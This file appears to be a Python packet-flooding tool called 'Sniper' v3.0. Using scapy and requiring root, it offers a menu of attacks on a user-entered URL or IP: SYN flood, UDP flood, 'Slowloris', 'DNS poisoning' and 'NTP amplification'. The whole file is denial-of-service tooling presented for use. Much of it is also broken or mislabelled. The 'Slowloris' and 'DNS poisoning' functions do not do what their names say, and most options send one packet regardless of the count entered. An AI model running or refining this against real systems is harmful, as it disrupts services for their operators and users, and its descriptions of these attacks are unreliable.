import os
import sys
import socket
from scapy.all import *
from urllib.parse import urlparse
from colorama import Fore, Style, init

init()

ascii_art = """
\033[91m
   _____       _
  / ____|     (_)
 | (___  _ __  _ _ __   ___ _ __
  \___ \| '_ \| | '_ \ / _ \ '__|
  ____) | | | | | |_) |  __/ |
 |_____/|_| |_|_| .__/ \___|_|
      v3.0      | |
                |_| by JRDP Team  https://github.com/JRDPCN
\033[0m
"""

def get_default_port(url):
    try:
        parsed_url = urlparse(url)
        return parsed_url.port if parsed_url.port else 443 if parsed_url.scheme == "https" else 80
    except ValueError:
        return 80

def get_target_ip(target_url):
    try:
        parsed_url = urlparse(target_url)
        if parsed_url.scheme:
            target_ip = socket.gethostbyname(parsed_url.netloc)
        else:
            target_ip = socket.gethostbyname(target_url)
        return target_ip
    except socket.gaierror:
        print(f"\033[91mError: Unable to resolve host {target_url}\033[0m")
        sys.exit(1)

def send_http_get_packet(target_ip, port):
    try:
        http_request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
        packet = IP(dst=target_ip)/TCP(dport=port, sport=RandShort())/Raw(load=http_request.encode())
        send(packet, verbose=0)
        print(f"\033[94mHTTP GET packet sent to {target_ip} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def send_dns_request_packet(target_ip, port):
    try:
        packet = IP(dst=target_ip)/UDP(dport=port)/DNS(rd=1, qd=DNSQR(qname="example.com"))
        send(packet, verbose=0)
        print(f"\033[94mDNS Request packet sent to {target_ip} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def send_arp_request_packet(target_ip):
    try:
        packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip)
        sendp(packet, verbose=0)
        print(f"\033[94mARP Request packet sent to {target_ip} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def send_syn_flood_packet(target_ip, port):
    try:
        packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
        send(packet, verbose=0)
        print(f"\033[94mSYN Flood packet sent to {target_ip} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def send_http_post_packet(target_ip, port):
    try:
        http_post_request = f"POST / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
        packet = IP(dst=target_ip)/TCP(dport=port, sport=RandShort())/Raw(load=http_post_request.encode())
        send(packet, verbose=0)
        print(f"\033[94mHTTP POST packet sent to {target_ip} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def send_icmp_echo_request_packet(target_ip):
    try:
        packet = IP(dst=target_ip)/ICMP()
        send(packet, verbose=0)
        print(f"\033[94mICMP Echo Request packet sent to {target_ip} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def send_udp_flood_packet(target_ip, port):
    try:
        packet = IP(dst=target_ip)/UDP(dport=port)
        send(packet, verbose=0)
        print(f"\033[94mUDP Flood packet sent to {target_ip} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def slowloris_attack(target_ip, num_connections, port):
    try:
        for _ in range(int(num_connections)):
            packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
            send(packet, verbose=0)
            print(f"\033[94mConnection established to {target_ip} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def ntp_amplification_attack(target_ip, num_packets, port):
    try:
        for _ in range(int(num_packets)):
            packet = IP(dst=target_ip)/UDP(dport=port)/NTP()
            send(packet, verbose=0)
            print(f"\033[94mNTP Amplification packet sent to {target_ip} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def dns_poisoning_attack(target_ip, num_packets, domain_to_poison, port):
    try:
        for _ in range(int(num_packets)):
            packet = IP(dst=target_ip)/UDP(dport=port)/DNS(rd=1, qd=DNSQR(qname=domain_to_poison))
            send(packet, verbose=0)
            print(f"\033[94mDNS Poisoning packet sent to {target_ip} for domain {domain_to_poison} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    if not 'SUDO_UID' in os.environ.keys():
        print(f"{Fore.RED}[!] Try executing Sniper as root.{Style.RESET_ALL}")
        exit()
    
    os.system('clear')
    print(ascii_art)
    target_url = input("\033[95mEnter URL or IP: \033[0m")

    default_port = get_default_port(target_url)
    print(f"\033[94mDefault port for {target_url}: {default_port}\033[0m")

    print("\033[94m1. HTTP GET\n2. DNS Request\n3. ARP Request\n4. SYN Flood\n5. HTTP POST\n6. ICMP Echo Request\n7. UDP Flood\n8. Slowloris Attack\n9. DNS Poisoning Attack\n10. NTP Amplification Attack\033[0m")
    packet_type = int(input("\033[95mSelect packet type: \033[0m"))
    
    num_packets = input("\033[95mEnter amount of packets: \033[0m")
    if packet_type in [3, 4, 11]:
        packet_size = input("\033[95mEnter size of packets (in KB) for TCP (use 0 for unlimited size): \033[0m")
    else:
        packet_size = None

    target_ip = get_target_ip(target_url)
    
    if packet_type == 1:
        send_http_get_packet(target_ip, default_port)
    elif packet_type == 2:
        send_dns_request_packet(target_ip, default_port)
    elif packet_type == 3:
        send_arp_request_packet(target_ip)
    elif packet_type == 4:
        send_syn_flood_packet(target_ip, default_port)
    elif packet_type == 5:
        send_http_post_packet(target_ip, default_port)
    elif packet_type == 6:
        send_icmp_echo_request_packet(target_ip)
    elif packet_type == 7:
        send_udp_flood_packet(target_ip, default_port)
    elif packet_type == 8:
        num_connections = input("\033[95mEnter number of connections for Slowloris Attack: \033[0m")
        slowloris_attack(target_ip, num_connections, default_port)
    elif packet_type == 9:
        domain_to_poison = input("\033[95mEnter the domain to poison: \033[0m")
        dns_poisoning_attack(target_ip, num_packets, domain_to_poison, default_port)
    elif packet_type == 10:
        ntp_amplification_attack(target_ip, num_packets, default_port)
    else:
        print(f"\033[91mInvalid packet type: {packet_type}\033[0m")
        
        
